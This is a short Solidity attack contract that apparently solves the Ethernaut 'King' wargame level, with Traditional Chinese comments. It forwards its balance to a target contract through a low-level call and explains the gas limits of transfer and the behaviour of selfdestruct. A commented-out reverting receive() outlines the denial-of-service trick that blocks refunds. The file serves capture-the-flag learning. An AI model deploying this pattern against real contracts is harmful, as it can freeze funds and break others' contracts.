// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address public king_address;

    constructor(address _target) {
        king_address = _target;
    }

    function toKing() public payable{
        // 當 transfer 被呼叫時，它只分配 2300 gas 給受款者的 fallback 或 receive 函數，
        // 這個數值足夠執行簡單的操作（例如記錄事件 emit Event()），但不夠修改合約的存儲（storage）
        // 或執行更複雜的邏輯。例如： king = msg.sender; 這個操作會失敗
        // 入存儲（storage） → 20,000 gas 這麼多
        // transfer 內部固定提供 2300 gas，防止受款者執行過多邏輯，減少重入攻擊風險。
        // payable(king_address).transfer(msg.value);

        // 這個只會讓 king_address 的餘額上升，不會觸發 receive() 函數，也不會成為國王、增加獎金，僅會增加餘額
        // selfdestruct() 發送 ETH 時，這種轉移是在 EVM（以太坊虛擬機）的較低層次完成的，
        // 而不是通過標準的訊息調用（message call）。
        // selfdestruct(payable(king_address));  

        // call{value: amount}("") 可自定義 gas 限制，以繞開 2300 gas 限制
        (bool success, ) = payable(king_address).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    /*  可選，無論有沒有註解，都是一樣效果
        如果沒有定義 receive() ，在其他合約同樣無法使用 transfer 發送代幣到此合約
        可參考 07_Force 合約是如何不接收代幣的
    receive() external payable {
        revert("I refuse ETH!");
        // 或是執行超過 2300 gas 的程序
    }
    */
}